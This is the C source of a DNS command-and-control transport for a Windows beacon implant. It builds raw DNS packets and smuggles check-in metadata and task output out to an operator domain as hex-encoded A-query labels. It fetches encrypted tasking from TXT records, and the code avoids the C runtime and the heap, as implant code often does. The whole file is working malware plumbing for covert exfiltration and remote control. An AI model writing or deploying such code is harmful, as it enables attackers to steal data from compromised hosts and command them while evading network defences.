// DNS C2 transport.
//
// Protocol:
//   Upload (beacon -> server): A queries carrying hex-encoded payload chunks
//     <d0_60hex>.<d1_60hex>.<type><seq4hex><txid8hex>.<domain>
//   Upload complete: fin.<cnt4hex>.<txid8hex>.<domain>
//   Poll (beacon -> server): TXT query
//     p.<txid8hex>.<domain>
//     Response: TXT record with hex-encoded encrypted frame, or empty (0.0.0.0)
//
// No CRT. No heap allocations. Stack buffers capped at 4096 bytes.

#include "../../core/beacon.h"
#include <winsock2.h>
#include <ws2tcpip.h>

// ---- Constants ------------------------------------------------------------

static const char kHexChar[] = "0123456789abcdef";

// DNS record types
#define DNS_TYPE_A   1
#define DNS_TYPE_TXT 16

// Timeout for DNS UDP recv: 3 seconds
#define DNS_RCVTIMEO_MS 3000

// ---- Session state --------------------------------------------------------

static int  g_wsa_ok      = 0;
static char g_txid[9]     = {0};   // 8 hex chars = 4 random bytes, null-terminated

// ---- Helpers: hex encode/decode ------------------------------------------

// Writes 2*len hex chars into out (no null terminator appended).
static void hex_encode_buf(const uint8_t* src, size_t len, char* out) {
    for (size_t i = 0; i < len; ++i) {
        out[i * 2]     = kHexChar[(src[i] >> 4) & 0xF];
        out[i * 2 + 1] = kHexChar[ src[i]       & 0xF];
    }
}

// Returns nibble value for a single hex char, or -1 on error.
static int hex_nibble(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

// Decodes hex string of length hex_len into out. Returns decoded byte count,
// or 0 on invalid input.
static size_t hex_decode_buf(const char* hex, size_t hex_len,
                             uint8_t* out, size_t out_cap) {
    if (hex_len & 1) return 0;
    size_t n = hex_len / 2;
    if (n > out_cap) return 0;
    for (size_t i = 0; i < n; ++i) {
        int hi = hex_nibble(hex[i * 2]);
        int lo = hex_nibble(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) return 0;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return n;
}

// Appends a decimal string for a uint32 into buf at *pos (no null term added).
static void append_dec(char* buf, size_t cap, size_t* pos, uint32_t v) {
    char tmp[12];
    int  tlen = 0;
    if (v == 0) {
        if (*pos + 1 < cap) buf[(*pos)++] = '0';
        return;
    }
    while (v > 0) { tmp[tlen++] = (char)('0' + v % 10); v /= 10; }
    for (int i = tlen - 1; i >= 0; --i) {
        if (*pos + 1 < cap) buf[(*pos)++] = tmp[i];
    }
}

// ---- WSA init & txid generation ------------------------------------------

static void dns_init(void) {
    if (g_wsa_ok) return;
    WSADATA wd;
    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) return;
    g_wsa_ok = 1;

    // Generate 4 random bytes and encode as 8 hex chars for the session txid.
    uint8_t rnd[4];
    bc_random(rnd, 4);
    hex_encode_buf(rnd, 4, g_txid);
    g_txid[8] = '\0';
}

// ---- Extract domain from uri_checkin ("dns://<domain>") ------------------

static void dns_get_domain(char* out, size_t cap) {
    BeaconState* st = beacon_state();
    const wchar_t* uri = st->uri_checkin;

    // Skip "dns://" prefix (6 wide chars).
    size_t i = 0;
    if (uri[0] == L'd' && uri[1] == L'n' && uri[2] == L's' &&
        uri[3] == L':' && uri[4] == L'/' && uri[5] == L'/') {
        i = 6;
    }
    size_t j = 0;
    for (; uri[i] && j + 1 < cap; ++i, ++j) {
        out[j] = (char)(uint8_t)uri[i];
    }
    out[j] = '\0';
}

// ---- Build server sockaddr from beacon_state host/port -------------------

static int dns_server_addr(struct sockaddr_in* out) {
    BeaconState* st = beacon_state();

    // Convert wide host to narrow.
    char host[128] = {0};
    for (int i = 0; st->host[i] && i < 127; ++i) {
        host[i] = (char)(uint8_t)st->host[i];
    }

    rt_memset(out, 0, sizeof(*out));
    out->sin_family = AF_INET;
    out->sin_port   = htons(st->port ? st->port : 53);
    return InetPtonA(AF_INET, host, &out->sin_addr);
}

// ---- Raw DNS packet builder ----------------------------------------------
// Builds a single-question DNS query.
// Returns total packet length written into buf, or 0 on error.

static int dns_build_query(const char* qname, uint16_t qtype,
                           uint8_t* buf, int cap) {
    if (cap < 12) return 0;

    // Header: ID=1, flags=RD (0x0100), QDCOUNT=1, rest=0.
    buf[0] = 0x00; buf[1] = 0x01;   // ID = 1
    buf[2] = 0x01; buf[3] = 0x00;   // Flags: RD=1
    buf[4] = 0x00; buf[5] = 0x01;   // QDCOUNT = 1
    buf[6] = 0x00; buf[7] = 0x00;   // ANCOUNT = 0
    buf[8] = 0x00; buf[9] = 0x00;   // NSCOUNT = 0
    buf[10]= 0x00; buf[11]= 0x00;   // ARCOUNT = 0

    int pos = 12;

    // Encode QNAME: split by '.', each label as [len][bytes], end with 0x00.
    const char* p = qname;
    while (*p) {
        // Find label end.
        const char* dot = p;
        while (*dot && *dot != '.') ++dot;
        int llen = (int)(dot - p);
        if (llen == 0) { p = dot + 1; continue; }
        if (pos + 1 + llen + 1 > cap) return 0;
        buf[pos++] = (uint8_t)llen;
        rt_memcpy(buf + pos, p, (size_t)llen);
        pos += llen;
        p = *dot ? dot + 1 : dot;
    }
    if (pos + 1 > cap) return 0;
    buf[pos++] = 0x00;   // root label

    // QTYPE and QCLASS.
    if (pos + 4 > cap) return 0;
    buf[pos++] = (uint8_t)(qtype >> 8);
    buf[pos++] = (uint8_t)(qtype);
    buf[pos++] = 0x00;
    buf[pos++] = 0x01;   // QCLASS = IN

    return pos;
}

// ---- UDP DNS query -------------------------------------------------------
// Sends one DNS query, receives response. Returns response length or -1.

static int dns_query(const char* qname, uint16_t qtype,
                     uint8_t* resp, int cap) {
    if (!g_wsa_ok) return -1;

    struct sockaddr_in srv;
    if (dns_server_addr(&srv) != 1) return -1;

    uint8_t pkt[512];
    int plen = dns_build_query(qname, qtype, pkt, (int)sizeof(pkt));
    if (plen <= 0) return -1;

    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return -1;

    // 3-second receive timeout.
    DWORD tv = DNS_RCVTIMEO_MS;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    int rc = -1;
    if (sendto(s, (const char*)pkt, plen, 0,
               (struct sockaddr*)&srv, sizeof(srv)) == plen) {
        int n = recvfrom(s, (char*)resp, cap, 0, NULL, NULL);
        if (n > 0) rc = n;
    }
    closesocket(s);
    return rc;
}

// ---- DNS response: skip a QNAME at pos -----------------------------------
// Handles pointer compression (0xC0xx). Returns new pos after the name.

static int skip_name(const uint8_t* resp, int resp_len, int pos) {
    while (pos < resp_len) {
        uint8_t n = resp[pos];
        if (n == 0) { pos++; break; }
        if ((n & 0xC0) == 0xC0) { pos += 2; break; }
        pos += 1 + (int)n;
    }
    return pos;
}

// ---- Parse TXT records from DNS response ---------------------------------
// Walks answer section, concatenates all TXT string bytes into out_hex.
// Returns total chars written.

static int dns_parse_txt(const uint8_t* resp, int resp_len,
                         char* out_hex, int cap) {
    if (resp_len < 12) return 0;

    uint16_t ancount = (uint16_t)((resp[6] << 8) | resp[7]);
    if (ancount == 0) return 0;

    // Skip question section.
    int pos = 12;
    pos = skip_name(resp, resp_len, pos);
    pos += 4;   // QTYPE + QCLASS
    if (pos >= resp_len) return 0;

    int written = 0;
    for (int a = 0; a < (int)ancount && pos < resp_len; ++a) {
        // Skip answer NAME.
        pos = skip_name(resp, resp_len, pos);
        if (pos + 10 > resp_len) break;

        uint16_t rtype  = (uint16_t)((resp[pos] << 8) | resp[pos+1]); pos += 2;
        /* class */                                                      pos += 2;
        /* ttl   */                                                      pos += 4;
        uint16_t rdlen  = (uint16_t)((resp[pos] << 8) | resp[pos+1]); pos += 2;
        int rdata_end   = pos + (int)rdlen;
        if (rdata_end > resp_len) break;

        if (rtype == DNS_TYPE_TXT) {
            // TXT RDATA: series of [len_byte][chars...]
            int rpos = pos;
            while (rpos < rdata_end) {
                uint8_t slen = resp[rpos++];
                for (int i = 0; i < (int)slen && rpos < rdata_end; ++i, ++rpos) {
                    if (written + 1 < cap)
                        out_hex[written++] = (char)resp[rpos];
                }
            }
        }
        pos = rdata_end;
    }
    if (written < cap) out_hex[written] = '\0';
    return written;
}

// ---- Upload data via A queries -------------------------------------------
// Splits data into 60-byte chunks, encodes each as two 60-hex-char labels,
// sends a fin query at the end.

static int dns_upload(const uint8_t* data, size_t len, char frame_type) {
    char domain[128];
    dns_get_domain(domain, sizeof(domain));

    uint16_t seq   = 0;
    size_t   off   = 0;

    while (off < len || seq == 0) {
        // Clamp chunk to 60 bytes; zero-pad if last chunk is smaller.
        uint8_t chunk[60];
        rt_memset(chunk, 0, sizeof(chunk));
        size_t take = len - off;
        if (take > 60) take = 60;
        if (take > 0) rt_memcpy(chunk, data + off, take);
        off += take;

        // d0 = first 30 bytes, d1 = next 30 bytes.
        char d0[61]; hex_encode_buf(chunk,      30, d0); d0[60] = '\0';
        char d1[61]; hex_encode_buf(chunk + 30, 30, d1); d1[60] = '\0';

        // meta: type(1) + seq(4) + txid(8) = 13 chars
        char meta[14];
        meta[0]  = frame_type;
        meta[1]  = kHexChar[(seq >> 12) & 0xF];
        meta[2]  = kHexChar[(seq >>  8) & 0xF];
        meta[3]  = kHexChar[(seq >>  4) & 0xF];
        meta[4]  = kHexChar[ seq        & 0xF];
        rt_memcpy(meta + 5, g_txid, 8);
        meta[13] = '\0';

        // Build qname: d0.d1.meta.domain
        char qname[512];
        size_t qi = 0;
        for (int i = 0; d0[i] && qi + 1 < sizeof(qname); ++i) qname[qi++] = d0[i];
        if (qi + 1 < sizeof(qname)) qname[qi++] = '.';
        for (int i = 0; d1[i] && qi + 1 < sizeof(qname); ++i) qname[qi++] = d1[i];
        if (qi + 1 < sizeof(qname)) qname[qi++] = '.';
        for (int i = 0; meta[i] && qi + 1 < sizeof(qname); ++i) qname[qi++] = meta[i];
        if (qi + 1 < sizeof(qname)) qname[qi++] = '.';
        for (int i = 0; domain[i] && qi + 1 < sizeof(qname); ++i) qname[qi++] = domain[i];
        qname[qi] = '\0';

        uint8_t resp[512];
        dns_query(qname, DNS_TYPE_A, resp, (int)sizeof(resp));

        ++seq;

        // If all data sent (or len==0 and first iteration done), break.
        if (off >= len) break;
    }

    // Send fin query: fin.<cnt4hex>.<len8hex>.<txid8>.<domain>
    // len = реальная длина данных (до паддинга), 8 hex = uint32_t.
    uint16_t  cnt  = seq;
    uint32_t  rlen = (uint32_t)len;   // оригинальный размер без паддинга
    char fin_qname[256];
    size_t fi = 0;
    const char fin_prefix[] = "fin.";
    for (int i = 0; fin_prefix[i] && fi + 1 < sizeof(fin_qname); ++i)
        fin_qname[fi++] = fin_prefix[i];
    // cnt4hex
    fin_qname[fi++] = kHexChar[(cnt >> 12) & 0xF];
    fin_qname[fi++] = kHexChar[(cnt >>  8) & 0xF];
    fin_qname[fi++] = kHexChar[(cnt >>  4) & 0xF];
    fin_qname[fi++] = kHexChar[ cnt        & 0xF];
    fin_qname[fi++] = '.';
    // len8hex
    fin_qname[fi++] = kHexChar[(rlen >> 28) & 0xF];
    fin_qname[fi++] = kHexChar[(rlen >> 24) & 0xF];
    fin_qname[fi++] = kHexChar[(rlen >> 20) & 0xF];
    fin_qname[fi++] = kHexChar[(rlen >> 16) & 0xF];
    fin_qname[fi++] = kHexChar[(rlen >> 12) & 0xF];
    fin_qname[fi++] = kHexChar[(rlen >>  8) & 0xF];
    fin_qname[fi++] = kHexChar[(rlen >>  4) & 0xF];
    fin_qname[fi++] = kHexChar[ rlen        & 0xF];
    fin_qname[fi++] = '.';
    // txid8
    rt_memcpy(fin_qname + fi, g_txid, 8); fi += 8;
    fin_qname[fi++] = '.';
    for (int i = 0; domain[i] && fi + 1 < sizeof(fin_qname); ++i)
        fin_qname[fi++] = domain[i];
    fin_qname[fi] = '\0';

    uint8_t resp2[512];
    dns_query(fin_qname, DNS_TYPE_A, resp2, (int)sizeof(resp2));
    return 0;
}

// ---- Poll TXT for server response ----------------------------------------
// Sends p.<txid>.<domain> TXT query, decodes hex response.
// Returns number of bytes decoded, or 0 if no data.

static size_t dns_poll_response(uint8_t* out_buf, size_t cap,
                                int max_retries, DWORD retry_ms) {
    char domain[128];
    dns_get_domain(domain, sizeof(domain));

    char qname[256];
    size_t qi = 0;
    // "p."
    qname[qi++] = 'p';
    qname[qi++] = '.';
    rt_memcpy(qname + qi, g_txid, 8); qi += 8;
    qname[qi++] = '.';
    for (int i = 0; domain[i] && qi + 1 < sizeof(qname); ++i)
        qname[qi++] = domain[i];
    qname[qi] = '\0';

    for (int attempt = 0; attempt < max_retries; ++attempt) {
        if (attempt > 0 && retry_ms > 0)
            Sleep(retry_ms);

        uint8_t resp[4096];
        int rlen = dns_query(qname, DNS_TYPE_TXT, resp, (int)sizeof(resp));
        if (rlen < 12) continue;

        // Check if we got a real A 0.0.0.0 (no data) or TXT.
        // If ANCOUNT == 0 → no data.
        uint16_t ancount = (uint16_t)((resp[6] << 8) | resp[7]);
        if (ancount == 0) continue;

        char hex_buf[8192];
        int hlen = dns_parse_txt(resp, rlen, hex_buf, (int)sizeof(hex_buf));
        if (hlen <= 0) continue;

        // hex_buf contains hex-encoded bytes; decode into out_buf.
        size_t decoded = hex_decode_buf(hex_buf, (size_t)hlen, out_buf, cap);
        if (decoded > 0) return decoded;
    }
    return 0;
}

// ---- TransportVtbl implementations ----------------------------------------

static int dns_checkin(const uint8_t* metadata, size_t metadata_len,
                       uint8_t* out_frame, size_t* out_frame_len) {
    dns_init();

    // Upload checkin frame as 'c' type chunks.
    dns_upload(metadata, metadata_len, 'c');

    // Poll server for reply (checkin reply = beacon_id + session info).
    size_t got = dns_poll_response(out_frame, *out_frame_len, 30, 1000);
    *out_frame_len = got;
    return 0;
}

static int dns_poll_tasks(uint8_t* out_frame, size_t* out_frame_len) {
    // Single attempt poll — called from main loop with jitter sleep already done.
    size_t got = dns_poll_response(out_frame, *out_frame_len, 1, 0);
    *out_frame_len = got;
    return 0;
}

static int dns_submit_output(const uint8_t* frame, size_t frame_len) {
    dns_upload(frame, frame_len, 'o');
    return 0;
}

const TransportVtbl g_transport_dns = {
    .checkin         = dns_checkin,
    .poll_tasks      = dns_poll_tasks,
    .submit_output   = dns_submit_output,
    .connection_lost = NULL,
};
